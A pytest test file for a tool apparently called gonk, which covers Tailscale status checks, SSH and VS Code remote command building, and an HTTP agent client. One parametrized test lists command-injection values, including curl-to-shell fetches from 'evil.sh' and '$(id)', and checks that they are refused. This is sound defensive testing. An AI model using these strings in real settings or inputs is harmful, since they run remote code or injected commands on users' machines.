from __future__ import annotations

import json
from typing import Any

import httpx
import pytest

from gonk.core.config import Config, save_home_token
from gonk.core.errors import GonkError, hints_from
from gonk.core.system import Result
from gonk.home import ssh, status
from gonk.home.client import AgentClient, AgentRefused, AgentUnreachable
from gonk.home.transport import Ssh, Tailscale, transport_for

from .fakes import FakeSystem


def tailnet(state: str = "Running", online: bool = True, name: str = "gonksystem") -> Result:
    data: dict[str, Any] = {
        "BackendState": state,
        "Self": {"HostName": "laptop", "DNSName": "laptop.tail1234.ts.net.", "Online": True},
        "Peer": {
            "nodekey:abc": {
                "HostName": name,
                "DNSName": f"{name}.tail1234.ts.net.",
                "TailscaleIPs": ["100.64.0.7", "fd7a:115c:a1e0::7"],
                "Online": online,
            }
        },
    }
    return Result(0, json.dumps(data))


def with_tailscale(result: Result, **kwargs: Any) -> FakeSystem:
    return FakeSystem(installed={"tailscale": ""}, results={"tailscale status": result}, **kwargs)


def summary(checks: list[Any]) -> list[tuple[str, str]]:
    return [(check.name, check.status) for check in checks]


# --- tailscale -----------------------------------------------------------------


def test_tailscale_not_installed(config: Config) -> None:
    checks = Tailscale().checks(config, FakeSystem())
    assert summary(checks) == [("Tailscale installed", "fail")]
    assert hints_from(checks) == ["gonk tools install tailscale"]


def test_tailscale_installed_but_not_connected(config: Config) -> None:
    """The example from the brief."""
    checks = Tailscale().checks(config, with_tailscale(tailnet(state="Stopped")))
    assert summary(checks) == [("Tailscale installed", "ok"), ("Tailscale connected", "fail")]
    assert hints_from(checks) == ["sudo tailscale up"]


def test_tailscale_needs_login(config: Config) -> None:
    checks = Tailscale().checks(config, with_tailscale(tailnet(state="NeedsLogin")))
    assert checks[-1].status == "fail"
    assert checks[-1].detail == "NeedsLogin"


def test_tailscale_daemon_not_running(config: Config) -> None:
    checks = Tailscale().checks(config, with_tailscale(Result(1, "", "failed to connect")))
    assert checks[-1].status == "fail"
    assert "tailscaled" in checks[-1].hint


def test_home_is_not_in_the_tailnet(config: Config) -> None:
    checks = Tailscale().checks(config, with_tailscale(tailnet(name="someone-else")))
    assert summary(checks)[-1] == ("gonksystem is in your tailnet", "fail")
    assert "gonk config set home.host" in checks[-1].hint


def test_home_is_offline(config: Config) -> None:
    checks = Tailscale().checks(config, with_tailscale(tailnet(online=False)))
    assert summary(checks)[-1] == ("gonksystem is online", "fail")


def test_home_is_online(config: Config) -> None:
    checks = Tailscale().checks(config, with_tailscale(tailnet()))
    assert all(check.status == "ok" for check in checks)
    assert checks[-1].detail == "100.64.0.7"


@pytest.mark.parametrize(
    "host", ["gonksystem", "GonkSystem", "gonksystem.tail1234.ts.net", "100.64.0.7"]
)
def test_home_can_be_named_several_ways(config: Config, host: str) -> None:
    config.home.host = host
    assert Tailscale().checks(config, with_tailscale(tailnet()))[-1].status == "ok"


def test_address_prefers_a_name_that_resolves(config: Config) -> None:
    magic_dns = with_tailscale(tailnet(), resolvable=["gonksystem"])
    assert Tailscale().address(config, magic_dns) == "gonksystem"
    assert Tailscale().address(config, with_tailscale(tailnet())) == "100.64.0.7"


def test_ssh_transport_trusts_ssh_config(config: Config) -> None:
    config.home.host = "home-via-jump"
    checks = Ssh().checks(config, FakeSystem())
    assert checks[0].status == "info"  # not resolvable is not an error: it may be an alias
    assert Ssh().address(config, FakeSystem()) == "home-via-jump"


def test_unknown_transport(config: Config) -> None:
    config.home.transport = "carrier-pigeon"
    with pytest.raises(GonkError, match="not a transport Gonk knows"):
        transport_for(config)


# --- the layers ------------------------------------------------------------------


def test_already_home(config: Config) -> None:
    report = status.inspect(config, FakeSystem(hostname="gonksystem"))
    assert report.is_here
    assert report.reachable


def test_stops_at_the_first_broken_layer(config: Config) -> None:
    system = with_tailscale(tailnet(state="Stopped"))
    report = status.inspect(config, system)
    assert not report.network_ok
    assert summary(report.checks) == [
        ("Tailscale installed", "ok"),
        ("Tailscale connected", "fail"),
    ]
    assert not any(check.name.startswith("SSH") for check in report.checks)


def test_network_up_but_ssh_closed(config: Config) -> None:
    report = status.inspect(config, with_tailscale(tailnet()))
    assert summary(report.checks)[-1] == ("SSH on gonksystem", "fail")
    assert "connection refused" in report.checks[-1].detail
    assert not report.network_ok


def test_reachable_without_a_token_is_still_reachable(config: Config) -> None:
    system = with_tailscale(tailnet(), open_ports=[("100.64.0.7", 22)])
    report = status.inspect(config, system)
    assert report.network_ok
    assert report.reachable  # the agent is optional; a shell still works
    assert summary(report.checks)[-1] == ("Gonk Agent", "warn")
    assert "gonk home pair" in report.checks[-1].hint


# --- ssh -------------------------------------------------------------------------


def test_shell_command(config: Config) -> None:
    config.home.user = "marc"
    argv = ssh.shell_command(config, "100.64.0.7")
    assert argv[:3] == ["ssh", "-t", "marc@100.64.0.7"]
    assert "tmux -u new-session -A -s gonk" in argv[3]
    assert "export LANG=C.UTF-8" in argv[3]  # Windows ssh sends no locale
    assert ssh.shell_command(config, "h", tmux=False) == ["ssh", "-t", "marc@h"]


def test_shell_command_with_a_port_and_no_user(config: Config) -> None:
    config.home.ssh_port = 2222
    assert ssh.shell_command(config, "h", tmux=False) == ["ssh", "-t", "-p", "2222", "h"]


def test_code_command(config: Config) -> None:
    config.home.user = "marc"
    config.home.code_path = "/home/marc/Code"
    assert ssh.code_command(config, "gonksystem") == [
        "code", "--remote", "ssh-remote+marc@gonksystem", "/home/marc/Code",
    ]  # fmt: skip
    assert ssh.code_command(config, "gonksystem", "/srv/app")[-1] == "/srv/app"


@pytest.mark.parametrize(
    ("setting", "value"),
    [
        ("host", "-oProxyCommand=curl evil.sh|sh"),
        ("host", "home; reboot"),
        ("host", "a b"),
        ("host", ""),
        ("user", "-l root"),
        ("user", "marc;id"),
        ("tmux_session", "x; curl evil.sh | sh"),
        ("tmux_session", "$(id)"),
        ("ssh_port", 0),
        ("ssh_port", 70000),
    ],
)
def test_settings_that_could_become_options_or_commands_are_refused(
    config: Config, setting: str, value: Any
) -> None:
    setattr(config.home, setting, value)
    with pytest.raises(GonkError):
        ssh.shell_command(config, "gonksystem")


def test_code_path_cannot_be_an_option(config: Config) -> None:
    with pytest.raises(GonkError, match="not a folder"):
        ssh.code_command(config, "gonksystem", "--install-extension=evil")


# --- agent client ----------------------------------------------------------------


def client_answering(handler: Any) -> AgentClient:
    http = httpx.Client(transport=httpx.MockTransport(handler), base_url="http://gonksystem:4665")
    return AgentClient("gonksystem", 4665, "gonk_token", name="gonksystem", http=http)


def test_connection_refused_is_explained() -> None:
    def refuse(request: httpx.Request) -> httpx.Response:
        raise httpx.ConnectError("[Errno 111] Connection refused")

    with pytest.raises(AgentUnreachable) as caught:
        client_answering(refuse).whoami()
    assert "Could not reach the Gonk Agent on gonksystem" in caught.value.message
    assert "111" not in caught.value.message
    assert "gonk home status" in caught.value.hints[0]


def test_timeout_is_explained() -> None:
    def hang(request: httpx.Request) -> httpx.Response:
        raise httpx.ReadTimeout("timed out")

    with pytest.raises(AgentUnreachable, match="did not answer in time"):
        client_answering(hang).whoami()


def test_rejected_token_is_explained() -> None:
    with pytest.raises(AgentRefused) as caught:
        client_answering(lambda request: httpx.Response(401, json={"error": "no"})).whoami()
    assert "gonk home pair" in " ".join(caught.value.hints)


def test_something_else_on_the_port() -> None:
    with pytest.raises(AgentUnreachable, match="not a Gonk Agent"):
        client_answering(lambda request: httpx.Response(200, text="<html>nginx</html>")).whoami()


def test_the_token_is_sent_as_a_bearer_header() -> None:
    seen: list[str] = []

    def answer(request: httpx.Request) -> httpx.Response:
        seen.append(request.headers["authorization"])
        assert "gonk_token" not in str(request.url)
        return httpx.Response(200, json={"result": 1})

    assert client_answering(answer).call("gonk.status") == 1
    assert seen == ["Bearer gonk_token"]


def test_ipv6_addresses_are_bracketed() -> None:
    assert AgentClient("fd7a:115c:a1e0::7", 4665, "t").base_url == "http://[fd7a:115c:a1e0::7]:4665"


def test_agent_check_without_network(config: Config) -> None:
    save_home_token(config, "gonk_token")
    # Port 1 on loopback: nothing listens there, so this exercises the real
    # connection-refused path without leaving the machine.
    config.home.agent_port = 1
    check = status.agent_check(config, FakeSystem(), "127.0.0.1")
    assert check.status == "warn"
    assert "gonk agent start" in check.hint
